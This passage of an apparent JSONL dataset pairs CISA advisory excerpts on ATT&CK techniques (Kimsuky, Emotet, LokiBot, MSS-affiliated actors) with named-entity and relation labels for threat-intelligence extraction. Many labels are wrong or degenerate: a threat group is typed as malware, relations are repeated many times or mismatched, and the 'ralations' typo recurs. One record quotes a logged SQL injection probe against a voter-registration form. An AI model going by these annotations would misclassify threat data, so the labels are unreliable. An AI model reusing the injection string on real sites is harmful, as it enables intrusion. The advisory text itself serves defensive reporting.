(T1548, technique)\nRelationships: No related ralations."}
{"instruction": "Abuse Elevation Control Mechanism Defense Evasion [TA0005] T1564.001 Hide Artifacts: Hidden Files and Directories Discovery [TA0007] T1033 System Owner/User Discovery Exfiltration [TA0010] T1041 Exfiltration Over C2 Channel Command and Control [TA0011] T1071.001 Application Layer Protocol: Web Protocols Command and Control [TA0011] T1573 Encrypted Channel Command and Control [TA0011] T1573.001 Encrypted Channel: Symmetric Cryptography", "input": null, "output": "Named Entities: (TA0005, technique), (T1564.001, technique), (TA0007, technique), (T1033, technique), (TA0010, technique), (T1041, technique), (TA0011, technique), (T1071.001, technique), (TA0011, technique), (T1573, technique), (TA0011, technique), (T1573.001, technique)\nRelationships: No related ralations."}
{"instruction": "When PowerShell is necessary, restrict PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration. Privileged Account Management [M1026] Configure the Increase Scheduling Priority option only to allow the Administrators group the rights to schedule a priority process. Operating System Configuration [M1028] Configure settings for scheduled tasks to force tasks to run under the authenticated account\u2019s context instead of allowing them to run as SYSTEM. Network Intrusion Prevention [M1031] Use network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware and mitigate activity at the network level. Execution Prevention [M1038] Use application control tools where appropriate. Execution Prevention [M1038] Use application control tools to prevent the running of executables masquerading as other files. Behavior Prevention on Endpoint [M1040]", "input": null, "output": "Named Entities: (PowerShell, tool), (TA0004, technique)\nRelationships: (PowerShell, necessary for, TA0004)"}
{"instruction": "The threat actor has also used on-premises access to manipulate and bypass identity controls and multi-factor authentication. This activity demonstrates how sophisticated adversaries can use credentials from one portion of an organization to move laterally (Lateral Movement [TA0008]) through trust boundaries, evade defenses and detection (Defense Evasion [TA0005]), and steal sensitive data (Collection [TA0009]). This level of compromise is challenging to remediate and requires a rigorous multi-disciplinary effort to regain administrative control before recovering.", "input": null, "output": "Named Entities: (threat actor, attacker), (TA0008, technique), (TA0005, technique), (TA0009, technique)\nRelationships: (threat actor, use, TA0009), (threat actor, evade, TA0009), (threat actor, steal, TA0009)"}
{"instruction": "While not a full anti-forensic technique, the adversary is heavily leveraging compromised or spoofed tokens for accounts for lateral movement. This will frustrate commonly used detection techniques in many environments. Since valid, but unauthorized, security tokens and accounts are utilized, detecting this activity will require the maturity to identify actions that are outside of a user\u2019s normal duties. For example, it is unlikely that an account associated with the HR department would need to access the cyber threat intelligence database. Taken together, these observed techniques indicate an adversary who is skilled, stealthy with operational security, and is willing to expend significant resources to maintain covert presence. Privilege Escalation and Persistence [TA0004, TA0003]", "input": null, "output": "Named Entities: (TA0004, technique), (TA0003, technique)\nRelationships: No related ralations."}
{"instruction": "Technical Details ATT&CK Profile CISA created the following MITRE ATT&CK profile to provide a non-exhaustive list of tactics, techniques, and procedures (TTPs) employed by APT actors to break through think tanks\u2019 defenses, conduct reconnaissance in their environments, exfiltrate proprietary or confidential information, and execute effects on targets. These TTPs were included based upon closed reporting on APT actors that are known to target think tanks or based upon CISA incident response data. Initial Access [TA0001] Valid Accounts [T1078] Valid Accounts: Cloud Accounts [T1078.004] External Remote Services [T1133] Drive-by Compromise [T1189] Exploit Public-Facing Application [T1190] Supply Chain Compromise: Compromise Software Supply Chain [T1195.002] Trusted Relationship [T1199] Phishing: Spearphishing Attachment [T1566.001] Phishing: Spearphishing Link [T1566.002] Phishing: Spearphishing via Service [T1566.003] Execution [TA0002] Windows Management Instrumentation [T1047] Scheduled Task/Job: Scheduled Task [T1053.005] Command and Scripting Interpreter: PowerShell [T1059.001] Command and Scripting Interpreter: Windows Command Shell [T1059.003] Command and Scripting Interpreter: Unix Shell [T1059.004]", "input": null, "output": "Named Entities: (APT actors, attacker), (T1078, technique), (T1078.004, technique), (T1133, technique), (T1189, technique), (T1190, technique), (T1195.002, technique), (T1199, technique), (T1566.001, technique), (T1566.002, technique), (T1566.003, technique), (TA0002, technique), (T1047, technique), (T1053.005, technique), (T1059.001, technique), (T1059.003, technique), (T1059.004, technique)\nRelationships: (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004), (APT actors, employ, T1059.004)"}
{"instruction": "Technical Details Analysis by CISA and the FBI indicates this actor scanned state websites, to include state election websites, between September 20 and September 28, 2020, with the Acunetix vulnerability scanner (Active Scanning: Vulnerability Scanning [T1595.002]). Acunetix is a widely used and legitimate web scanner, which has been used by threat actors for nefarious purposes. Organizations that do not regularly use Acunetix should monitor their logs for any activity from the program that originates from IP addresses provided in this advisory and consider it malicious reconnaissance behavior. Additionally, CISA and the FBI observed this actor attempting to exploit websites to obtain copies of voter registration data between September 29 and October 17, 2020 (Exploit Public-Facing Application [T1190]). This includes attempted exploitation of known vulnerabilities, directory traversal, Structured Query Language (SQL) injection, web shell uploads, and leveraging unique flaws in websites.", "input": null, "output": "Named Entities: (Acunetix, tool), (T1595.002, technique), (T1190, technique)\nRelationships: (Acunetix, use, T1190), (Acunetix, use, T1190)"}
{"instruction": "Acunetix Scanning\nCISA\u2019s analysis identified the scanning of multiple entities by the Acunetix Web Vulnerability scanning platform between September 20 and September 28, 2020 (Active Scanning: Vulnerability Scanning [T1595.002]).\u00a0\nThe actor used the scanner to attempt SQL injection into various fields in /registration/registration/details with status codes 404 or 500.\n/registration/registration/details?addresscity=-1 or 3*2<(0+5+513-513) -- &addressstreet1=xxxxx&btnbeginregistration=begin voter registration&btnnextelectionworkerinfo=next&btnnextpersonalinfo=next&btnnextresdetails=next&btnnextvoterinformation=next&btnsubmit=submit&chkageverno=on&chkageveryes=on&chkcitizenno=on&chkcitizenyes=on&chkdisabledvoter=on&chkelectionworker=on&chkresprivate=1&chkstatecancel=on&dlnumber=1&dob=xxxx/x/x&email=sample@email.tst&firstname=xxxxx&gender=radio&hdnaddresscity=&hdngender=&last4ssn=xxxxx&lastname=xxxxxinjjeuee&mailaddresscountry=sample@xxx.xxx&mailaddressline1=sample@email.tst&mailaddressline2=sample@xxx.xxx&mailaddressline3=sample@xxx.xxx&mailaddressstate=aa&mailaddresszip=sample@xxxx.xxx&mailaddresszipex=sample@xxx.xxx&middlename=xxxxx&overseas=1&partycode=a&phoneno1=xxx-xxx-xxxx&phoneno2=xxx-xxx-xxxx&radio=consent&statecancelcity=xxxxxxx&statecancelcountry=usa&statecancelstate=XXaa&statecancelzip=xxxxx&statecancelzipext=xxxxx&suffixname=esq&txtmailaddresscity=sample@xxx.xxx", "input": null, "output": "Named Entities: (Acunetix, tool), (T1595.002, technique)\nRelationships: (Acunetix, use, T1595.002)"}
{"instruction": "Obtaining Voter Registration Data\nFollowing the review of web server access logs, CISA analysts, in coordination with the FBI, found instances of the cURL and FDM User Agents sending GET requests to a web resource associated with voter registration data. The activity occurred between September 29 and October 17, 2020. Suspected scripted activity submitted several hundred thousand queries iterating through voter identification values, and retrieving results with varying levels of success [Gather Victim Identity Information (T1589)]. A sample of the records identified by the FBI reveals they match information in the aforementioned propaganda video.", "input": null, "output": "Named Entities: (cURL, tool), (FDM User Agents, tool), (T1589, technique)\nRelationships: No related ralations."}
{"instruction": "Kimsuky has demonstrated the ability to establish Persistence [TA0003] through using malicious browser extensions, modifying system processes, manipulating the autostart execution, using Remote Desktop Protocol (RDP), and changing the default file association for an application. By using these methods, Kimsuky can gain login and password information and/or launch malware outside of some application allowlisting solutions. In 2018, Kimsuky used an extension, which was available on the Google Chrome Web Store, to infect victims and steal passwords and cookies from their browsers (Man-in-the-Browser [T1185]). The extension\u2019s reviews gave it a five-star rating, however the text of the reviews applied to other extensions or was negative. The reviews were likely left by compromised Google+ accounts.[28]", "input": null, "output": "Named Entities: (Kimsuky, malware), (TA0003, technique), (T1185, technique), (Google Chrome Web Store, tool), (Google+, tool)\nRelationships: (Kimsuky, use, T1185), (Kimsuky, use, T1185), (Google Chrome Web Store, used by, Kimsuky), (Google+, compromised, Kimsuky)"}
{"instruction": "Kimsuky may install a new service that can execute at startup by using utilities to interact with services or by directly modifying the Registry keys (Boot or Logon Autostart Execution [T1547]). The service name may be disguised with the name from a related operating system function or by masquerading as benign software. Services may be created with administrator privileges but are executed under system privileges, so an adversary can also use a service to escalate privileges from Administrator to System. They can also directly start services through Service Execution.[29],[30] During the STOLEN PENCIL operation in May 2018, Kimsuky used the GREASE malware. GREASE is a tool capable of adding a Windows administrator account and enabling RDP while avoiding firewall rules (Remote Services: Remote Desktop Protocol [T1021.001]).[31]", "input": null, "output": "Named Entities: (Kimsuky, malware), (GREASE, malware), (T1547, technique), (T1021.001, technique)\nRelationships: (Kimsuky, use, T1021.001), (Kimsuky, use, GREASE), (GREASE, use, T1021.001)"}
{"instruction": "Kimsuky uses a document stealer module that changes the default program associated with Hangul Word Processor (HWP) documents (.hwp files) in the Registry (Event Triggered Execution: Change Default File Association [T1546.001]). Kimsuky manipulates the default Registry setting to open a malicious program instead of the legitimate HWP program (HWP is a Korean word processor). The malware will read and email the content from HWP documents before the legitimate HWP program ultimately opens the document.[32] Kimsuky also targets Microsoft Office users by formatting their documents in a .docx file rather than .hwp and will tailor their macros accordingly.[33]", "input": null, "output": "Named Entities: (Kimsuky, malware), (document stealer module, tool), (Hangul Word Processor, tool), (T1546.001, technique), (Microsoft Office, tool)\nRelationships: (Kimsuky, use, T1546.001), (Kimsuky, use, document stealer module), (document stealer module, change, Hangul Word Processor), (Kimsuky, target, Microsoft Office)"}
{"instruction": "Kimsuky maintains access to compromised domains by uploading actor-modified versions of open-source Hypertext Processor (PHP)-based web shells; these web shells enable the APT actor to upload, download, and delete files and directories on the compromised domains (Server Software Component: Web Shell [T1505.003]). The actor often adds \u201cDinosaur\u201d references within the modified web shell codes.[34] Privilege Escalation Kimsuky uses well-known methods for Privilege Escalation [TA0004]. These methods include placing scripts in the Startup folder, creating and running new services, changing default file associations, and injecting malicious code in explorer.exe.", "input": null, "output": "Named Entities: (Kimsuky, malware), (open-source Hypertext Processor (PHP)-based web shells, tool), (T1505.003, technique), (TA0004, technique)\nRelationships: (Kimsuky, use, TA0004), (Kimsuky, use, TA0004)"}
{"instruction": "Kimsuky has used Win7Elevate\u2014an exploit from the Metasploit framework\u2014to bypass the User Account Control to inject malicious code into explorer.exe (Process Injection [T1055]). This malicious code decrypts its spying library\u2014a collection of keystroke logging and remote control access tools and remote control download and execution tools\u2014from resources, regardless of the victim\u2019s operating system. It then saves the decrypted file to a disk with a random but hardcoded name (e.g., dfe8b437dd7c417a6d.tmp) in the user\u2019s temporary folder and loads this file as a library, ensuring the tools are then on the system even after a reboot. This allows for the escalation of privileges.[35] Before the injection takes place, the malware sets the necessary privileges (see figure 1). The malware writes the path to its malicious Dynamic Link Library (DLL) and ensures the remote process is loaded by creating a remote thread within explorer.exe (Process Injection [T1055]).[36]", "input": null, "output": "Named Entities: (Kimsuky, malware), (Metasploit framework, tool), (explorer.exe, file), (T1055, technique), (dfe8b437dd7c417a6d.tmp, file)\nRelationships: (Kimsuky, inject, explorer.exe), (explorer.exe, link to, T1055), (Kimsuky, save, dfe8b437dd7c417a6d.tmp)"}
{"instruction": "Figure 1: Privileges set for the injection [37] Defense Evasion Kimsuky uses well-known and widely available methods for Defense Evasion [TA0005] within a network. These methods include disabling security tools, deleting files, and using Metasploit.[38],[39] Kimsuky\u2019s malicious DLL runs at startup to zero (i.e., turn off) the Windows firewall Registry keys (see figure 2). This disables the Windows system firewall and turns off the Windows Security Center service, which prevents the service from alerting the user about the disabled firewall (see figure 2) (Impair Defenses: Disable or Modify System Firewall [T1562.004]).[40] Figure 2: Disabled firewall values in the Registry [41] Kimsuky has used a keylogger that deletes exfiltrated data on disk after it is transmitted to its C2 server (Indicator Removal on Host: File Deletion [T1070.004]).[42]", "input": null, "output": "Named Entities: (Kimsuky, malware), (TA0005, technique), (Metasploit, tool), (C2 server, tool), (T1562.004, technique), (T1070.004, technique)\nRelationships: (Kimsuky, use, T1070.004), (Kimsuky, use, Metasploit), (Kimsuky, use, C2 server), (Kimsuky, use, T1070.004), (Kimsuky, use, T1070.004)"}
{"instruction": "Kimsuky collects data from the victim system through its HWP document malware and its keylogger (Collection [TA0009]). The HWP document malware changes the default program association in the Registry to open HWP documents (Event Triggered Execution: Change Default File Association [T1546.001]). When a user opens an HWP file, the Registry key change triggers the execution of malware that opens the HWP document and then sends a copy of the HWP document to an account under the adversary\u2019s control. The malware then allows the user to open the file as normal without any indication to the user that anything has occurred. The keylogger intercepts keystrokes and writes them to C:\\Program Files\\Common Files\\System\\Ole DB\\msolui80.inc and records the active window name where the user pressed keys (Input Capture: Keylogging [T1056.001]). There is another keylogger variant that logs keystrokes into C:\\WINDOWS\\setup.log.[56]", "input": null, "output": "Named Entities: (Kimsuky, malware), (keylogger, tool), (TA0009, technique), (T1546.001, technique), (T1056.001, technique), (C:\\Program Files\\Common Files\\System\\Ole DB\\msolui80.inc, file), (C:\\WINDOWS\\setup.log, file)\nRelationships: (Kimsuky, use, keylogger), (Kimsuky, use, T1056.001), (Kimsuky, use, T1056.001), (Kimsuky, use, T1056.001), (keylogger, log keystrokes, C:\\WINDOWS\\setup.log)"}
{"instruction": "Kimsuky has also used a Mac OS Python implant that gathers data from Mac OS systems and sends it to a C2 server (Command and Scripting Interpreter: Python [T1059.006]). The Python program downloads various implants based on C2 options specified after the filedown.php (see figure 4). Figure 4: Python Script targeting MacOS [57] Command and Control Kimsuky has used a modified TeamViewer client, version 5.0.9104, for Command and Control [TA0011] (Remote Access Software [T1219]). During the initial infection, the service \u201cRemote Access Service\u201d is created and adjusted to execute C:\\Windows\\System32\\vcmon.exe at system startup (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder [T1547.001]). Every time vcmon.exe is executed, it disables the firewall by zeroing out Registry values (Impair Defenses: Disable or Modify System Firewall [T1562.004]). The program then modifies the TeamViewer Registry settings by changing the TeamViewer strings in TeamViewer components.", "input": null, "output": "Named Entities: (Kimsuky, malware), (C2 server, tool), (T1059.006, technique), (TeamViewer client, tool), (Remote Access Service, tool), (C:\\Windows\\System32\\vcmon.exe, file), (T1547.001, technique), (T1562.004, technique)\nRelationships: (Kimsuky, use, C2 server), (Kimsuky, use, T1562.004), (Kimsuky, use, TeamViewer client), (Kimsuky, create, Remote Access Service), (Remote Access Service, execute, C:\\Windows\\System32\\vcmon.exe), (Kimsuky, use, T1562.004), (Kimsuky, use, T1562.004)"}
{"instruction": "There was no indication that the actor destroyed computers during the observed exfiltrations, suggesting Kimsuky\u2019s intention is to steal information, not to disrupt computer networks. Kimsuky\u2019s preferred method for sending or receiving exfiltrated information is through email, with their malware on the victim machine encrypting the data before sending it to a C2 server (Archive Collected Data [T1560]). Kimsuky also sets up auto-forward rules within a victim\u2019s email account (Email Collection: Email Forwarding Rule [T1114.003]). Kimsuky also uses an RC4 key generated as an MD5 hash or a randomly generated 117-bytes buffer to exfiltrate stolen data. The data is sent RSA-encrypted (Encrypted Channel: Symmetric Cryptography [T1573.001]). Kimsuky\u2019s malware constructs an 1120-bit public key and uses it to encrypt the 117-bytes buffer. The resulting data file is saved in C:\\Program Files\\Common Files\\System\\Ole DB\\ (Data Staged: Local Data Staging [T1074.001]).[60]", "input": null, "output": "Named Entities: (Kimsuky, malware), (T1560, technique), (T1114.003, technique), (T1074.001, technique)\nRelationships: (Kimsuky, use, T1074.001), (Kimsuky, use, T1074.001), (Kimsuky, use, T1074.001)"}
{"instruction": "Emotet has used WMI to execute powershell.exe. Process Injection: Dynamic-link Library Injection [T1055.001] Emotet has been observed injecting in to Explorer.exe and other processes. Process Discovery [T1057] Emotet has been observed enumerating local processes. Command and Scripting Interpreter: PowerShell [T1059.001] Emotet has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz. Command and Scripting Interpreter: Windows Command Shell [T1059.003] Emotet has used cmd.exe to run a PowerShell script. Command and Scripting Interpreter: Visual Basic [T1059.005] Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. Valid Accounts: Local Accounts [T1078.003] Emotet can brute force a local admin password, then use it to facilitate lateral movement. Account Discovery: Email Account [T1087.003] Emotet has been observed leveraging a module that can scrape email addresses from Outlook. Brute Force: Password Guessing [T1110.001]", "input": null, "output": "Named Entities: (Emotet, malware), (powershell.exe, file), (T1055.001, technique), (Explorer.exe, file), (T1057, technique), (Powershell, tool), (T1059.001, technique), (cmd.exe, file), (PowerShell script, tool), (Visual Basic, tool), (T1059.005, technique), (Microsoft Word, tool), (T1078.003, technique), (T1087.003, technique), (T1110.001, technique), (Mimikatz, tool)\nRelationships: (Emotet, execute, powershell.exe), (Emotet, use, T1110.001), (Emotet, inject in, Explorer.exe), (Emotet, use, T1110.001), (Emotet, use, Powershell), (Emotet, use, T1110.001), (Emotet, run, PowerShell script), (Emotet, use, T1110.001), (Emotet, use, T1110.001), (Emotet, use, T1110.001)"}
{"instruction": "Emotet has maintained persistence through a scheduled task. Unsecured Credentials: Credentials In Files [T1552.001] Emotet has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user. Credentials from Password Stores: Credentials from Web Browsers [T1555.003] Emotet has been observed dropping browser password grabber modules. Archive Collected Data [T1560] Emotet has been observed encrypting the data it collects before sending it to the C2 server. Phishing: Spearphishing Attachment [T1566.001] Emotet has been delivered by phishing emails containing attachments. Phishing: Spearphishing Link [T1566.002] Emotet has been delivered by phishing emails containing links. Non-Standard Port [T1571] Emotet has used HTTP over ports such as 20, 22, 7080, and 50000, in addition to using ports commonly associated with HTTP/Hypertext Transfer Protocol Secure. Encrypted Channel: Asymmetric Cryptography [T1573.002] Emotet is known to use RSA keys for encrypting C2 traffic.", "input": null, "output": "Named Entities: (Emotet, malware), (T1552.001, technique), (T1555.003, technique), (T1560, technique), (T1566.001, technique), (T1566.002, technique), (T1571, technique), (T1573.002, technique)\nRelationships: (Emotet, use, T1573.002), (Emotet, use, T1573.002), (Emotet, use, T1573.002), (Emotet, use, T1573.002), (Emotet, use, T1573.002), (Emotet, use, T1573.002), (Emotet, use, T1573.002)"}
{"instruction": "Monitor logs for failed authentication attempts to valid accounts. Use MFA. Set account lockout policies after a certain number of failed login attempts. Network Service Scanning [T1046] Use NIDS to identify scanning activity. Close unnecessary ports and services. Segment network to protect critical servers and devices. Email Collection [T1114] Monitor processes and command-line arguments for actions that could be taken to gather local email files. Encrypt sensitive emails. Audit auto-forwarding email rules regularly. Use MFA for public-facing webmail servers. Proxy: External Proxy [T1090.002] Analyze network data for uncommon data flows, such as a client sending significantly more data than it receives from an external server. Use NIDS and prevention systems to identify traffic for specific adversary malware using network signatures. Drive-by Compromise [T1189] Use Firewalls and proxies to inspect URLs for potentially known-bad domains or parameters.", "input": null, "output": "Named Entities: (T1046, technique), (T1114, technique), (T1090.002, technique), (T1189, technique)\nRelationships: No related ralations."}
{"instruction": "LokiBot has used Hypertext Transfer Protocol for command and control. System Information Discovery [T1082] LokiBot has the ability to discover the computer name and Windows product name/version. User Execution: Malicious File [T1204.002] LokiBot has been executed through malicious documents contained in spearphishing emails. Credentials from Password Stores [T1555] LokiBot has stolen credentials from multiple applications and data sources including Windows operating system credentials, email clients, File Transfer Protocol, and Secure File Transfer Protocol clients. Credentials from Password Stores: Credentials from Web Browsers [T1555.003] LokiBot has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and Chromium and Mozilla Firefox-based web browsers. Hide Artifacts: Hidden Files and Directories [T1564.001] LokiBot has the ability to copy itself to a hidden file and directory.", "input": null, "output": "Named Entities: (LokiBot, malware), (T1082, technique), (T1204.002, technique), (T1555, technique), (T1555.003, technique), (T1564.001, technique)\nRelationships: (LokiBot, use, T1564.001), (LokiBot, use, T1564.001), (LokiBot, use, T1564.001), (LokiBot, use, T1564.001), (LokiBot, use, T1564.001)"}
{"instruction": "Persistence CISA observed the threat actor using the techniques identified in table 4 to establish persistence. Table 4: Persistence techniques ID Technique/Sub-Technique Context T1053.003 Scheduled Task/Job: Cron The threat actor loaded a series of scripts to cron and ran them for various purposes (mainly to access NetScaler web forms). T1053.005 Scheduled Task/Job: Scheduled Task The threat actor installed and used FRPC (frpc.exe) on both NetScaler and internal devices. The task was named lpupdate and the binary was named svchost, which was the reverse proxy. The threat actor executed this command daily. T1505.003 Server Software Component: Web Shell The threat actor used several web shells on existing web servers. Both NetScaler and web servers called out for ChunkyTuna. T1546.008 Event Triggered Execution: Accessibility Features The threat actor used sticky keys (sethc.exe) to launch cmd.exe. Privilege Escalation", "input": null, "output": "Named Entities: (threat actor, attacker), (T1053.003, technique), (NetScaler, tool), (FRPC, tool), (T1505.003, technique), (ChunkyTuna, tool), (T1546.008, technique)\nRelationships: (threat actor, use, T1546.008), (threat actor, install, FRPC), (FRPC, tool, NetScaler), (threat actor, use, FRPC), (threat actor, use, T1546.008), (T1546.008, use, web shells), (web shells, call out, NetScaler), (NetScaler, tool, ChunkyTuna), (threat actor, use, T1546.008)"}
{"instruction": "CISA observed no evidence of direct privilege escalation. The threat actor attained domain administrator credentials on the NetScaler device via exploit and continued to expand credential access on the network. Defense Evasion CISA observed the threat actor using the techniques identified in table 5 to evade detection. Table 5: Defensive evasion techniques ID Technique/Sub-Technique Context T1027.002 Obfuscated Files or Information: Software Packing The threat actor used base64 encoding for payloads on NetScaler during initial access, making the pre-compiled payloads easier to avoid detection. T1027.004 Obfuscated Files or Information: Compile After Delivery The threat actor used base64 encoding schemes on distributed (uncompiled) scripts and files to avoid detection. T1036.004 Masquerading: Masquerade Task or Service", "input": null, "output": "Named Entities: (T1027.002, technique), (T1027.004, technique), (T1036.004, technique)\nRelationships: No related ralations."}
{"instruction": "OS Credential Dumping: Windows NT Directory Services (NTDS) The threat actor used Volume Shadow Copy to access credential information from the NTDS file. T1552.001 Unsecured Credentials: Credentials in Files The threat actor accessed files containing valid credentials. T1555 Credentials from Password Stores The threat actor accessed a KeePass database multiple times and used kee.ps1 PowerShell script. T1558 Steal or Forge Kerberos Tickets The threat actor conducted a directory traversal attack by creating files and exfiltrating a Kerberos ticket on a NetScaler device. The threat actor was then able to gain access to a domain account. Discovery CISA observed the threat actor using the techniques identified in table 7 to learn more about the victim environments. Table 7: Discovery techniques ID Technique/Sub-Technique Context T1018 Remote System Discovery The threat actor used Angry IP Scanner to detect remote systems. T1083 File and Directory Discovery", "input": null, "output": "Named Entities: (T1552.001, technique), (T1555, technique), (kee.ps1 PowerShell script, tool), (T1558, technique), (Angry IP Scanner, tool), (T1018, technique), (T1083, technique)\nRelationships: No related ralations."}
{"instruction": "The threat actor used PsExec. and PSEXECSVC pervasively on several hosts. The threat actor was also observed using a valid account to access SMB shares. T1021.004 Remote Services: SSH The threat actor used Plink and PuTTY for lateral movement. Artifacts of Plink were used for encrypted sessions in the system registry hive. T1021.005 Remote Services: Virtual Network Computing (VNC) The threat actor installed TightVNC server and client pervasively on compromised servers and endpoints in the network environment as lateral movement tool. T1563.002 Remote Service Session Hijacking: RDP Hijacking The threat actor likely hijacked a legitimate RDP session to move laterally within the network environment. Collection CISA observed the threat actor using the techniques identified in table 9 for collection within the victim environment. Table 9: Collection techniques ID Technique/Sub-Technique Context T1005 Data from Local System The threat actor searched local system sources to accessed sensitive documents. T1039", "input": null, "output": "Named Entities: (PsExec, tool), (PSEXECSVC, tool), (Plink, tool), (PuTTY, tool), (TightVNC server, tool), (TightVNC client, tool), (T1005, technique), (T1039, technique)\nRelationships: No related ralations."}
{"instruction": "Data from Network Shared Drive The threat actor searched network shares to access sensitive documents. T1213 Data from Information Repositories The threat actor accessed victim security/IT monitoring environments, Microsoft Teams, etc., to mine valuable information. T1530 Data from Cloud Storage Object The threat actor obtained files from the victim cloud storage instances. T1560.001 Archive Collected Data: Archive via Utility The threat actor used 7-Zip to archive data. Command and Control CISA observed the threat actor using the techniques identified in table 10 for command and control (C2). Table 10: Command and control techniques ID Technique/Sub-Technique Context T1071.001 Application Layer Protocol: Web Protocols The threat actor used various web mechanisms and protocols, including the web shells listed in table 1. T1105 Ingress Tool Transfer The threat actor downloaded tools such as PsExec directly to endpoints and downloaded web shells and scripts to NetScaler in base64-encoded schemes. T1572 Protocol Tunneling", "input": null, "output": "Named Entities: (T1560.001, technique), (7-Zip, tool), (T1071.001, technique), (T1105, technique), (T1572, technique)\nRelationships: (T1572, used by, threat actor), (7-Zip, used by, threat actor), (T1572, used by, threat actor), (T1572, used by, threat actor), (T1572, used by, threat actor)"}
{"instruction": "MITRE PRE-ATT&CK\u00ae Framework for Analysis In the last 12 months, CISA analysts have routinely observed Chinese MSS-affiliated actors using the following PRE-ATT&CK\u00ae Framework TTPs. Target Selection and Technical Information Gathering Target Selection [TA0014] is a critical part of cyber operations. While cyber threat actors\u2019 motivations and intents are often unknown, they often make their selections based on the target network\u2019s security posture. Threat actors can use information sources such as Shodan, the Common Vulnerabilities and Exposure (CVE) database, and the National Vulnerabilities Database (NVD).[3][4][5] Shodan is an internet search engine that can be used to identify vulnerable devices connected to the internet. Shodan queries can also be customized to discover specific vulnerabilities on devices, which enables sophisticated cyber threat actors to use relatively unsophisticated techniques to execute opportunistic attacks on susceptible targets.", "input": null, "output": "Named Entities: (Chinese MSS-affiliated actors, attacker), (TA0014, technique), (Shodan, tool)\nRelationships: (Chinese MSS-affiliated actors, use, TA0014), (Chinese MSS-affiliated actors, gather, Shodan)"}
{"instruction": "While using these data sources, CISA analysts have observed a correlation between the public release of a vulnerability and targeted scanning of systems identified as being vulnerable. This correlation suggests that cyber threat actors also rely on Shodan, the CVE database, the NVD, and other open-source information to identify targets of opportunity and plan cyber operations. Together, these data sources provide users with the understanding of a specific vulnerability, as well as a list of systems that may be vulnerable to attempted exploits. These information sources therefore contain invaluable information that can lead cyber threat actors to implement highly effective attacks. CISA has observed Chinese MSS-affiliated actors using the techniques in table 1 to gather technical information to enable cyber operations against Federal Government networks (Technical Information Gathering [TA0015]). Table 1: Technical information gathering techniques observed by CISA MITRE ID Name Observation T1245 Determine Approach/Attack Vector", "input": null, "output": "Named Entities: (Chinese MSS-affiliated actors, attacker), (TA0015, technique), (T1245, technique)\nRelationships: (Chinese MSS-affiliated actors, use, T1245), (Chinese MSS-affiliated actors, use, 1245)"}
{"instruction": "The threat actors narrowed the attack vectors to relatively recent vulnerability disclosures with open-source exploits. T1247 Acquire Open Source Intelligence (OSINT) Data Sets and Information CISA observed activity from network proxy service Internet Protocol (IP) addresses to three Federal Government webpages. This activity appeared to enable information gathering activities. T1254 Conduct Active Scanning CISA analysts reviewed the network activity of known threat actor IP addresses and found evidence of reconnaissance activity involving virtual security devices. Technical Weakness Identification", "input": null, "output": "Named Entities: (T1247, technique), (T1254, technique)\nRelationships: No related ralations."}
{"instruction": "CISA has observed the actors exploiting CVE-2020-0688 for remote code execution to enable email collection of targeted networks. Additionally, CISA has observed Chinese MSS-affiliated actors using the techniques listed in table 3 to identify technical weaknesses in Federal Government networks (Technical Weakness Identification [TA0018]). Table 3: Technical weakness identification techniques observed by CISA MITRE ID Name Observation T1288 Analyze Architecture and Configuration Posture CISA observed the cyber actors scanning a Federal Government agency for vulnerable web servers. CISA also observed the threat actors scanning for known vulnerable network appliance CVE-2019-11510. T1291 Research Relevant Vulnerabilities CISA has observed the threat actors scanning and reconnaissance of Federal Government internet-facing systems shortly after the disclosure of significant CVEs. Build Capabilities", "input": null, "output": "Named Entities: (CVE-2020-0688, vulnerability), (Chinese MSS-affiliated actors, attacker), (TA0018, technique), (T1288, technique), (T1291, technique), (CVE-2019-11510, vulnerability)\nRelationships: (CVE-2020-0688, exploited by, Chinese MSS-affiliated actors), (Chinese MSS-affiliated actors, use, T1291), (Chinese MSS-affiliated actors, use, T1291), (Chinese MSS-affiliated actors, use, T1291), (Chinese MSS-affiliated actors, scanning for, CVE-2019-11510)"}
{"instruction": "T1566.002 Phishing: Spearphishing Link CISA analyzed network activity of a Federal Government entity and concluded that the threat actors sent a malicious email weaponized with links. T1190 Exploit Public-Facing Application CISA has observed the actors leveraging CVE-2019-19781 to compromise Citrix Application Delivery Controllers. Cyber threat actors can continue to successfully launch these types of low-complexity attacks\u2014as long as misconfigurations in operational environments and immature patch management programs remain in place\u2014by taking advantage of common vulnerabilities and using readily available exploits and information. Execution CISA analysts continue to observe beaconing activity indicative of compromise or ongoing access to Federal Government networks. This beaconing is a result of cyber threat actors successfully completing cyber operations that are often designed around emergent vulnerabilities and reliant on existing exploitation tools, as mentioned in this document. CISA has observed Chinese MSS-affiliated actors using the Execution [TA0002] technique identified in table 7.", "input": null, "output": "Named Entities: (T1566.002 Phishing, threat type), (malicious email, tool), (links, tool), (T1190, technique), (CVE-2019-19781, vulnerability), (Citrix Application Delivery Controllers, tool), (Chinese MSS-affiliated actors, attacker), (TA0002, technique)\nRelationships: (actors, leverage, CVE-2019-19781), (Chinese MSS-affiliated actors, use, TA0002)"}
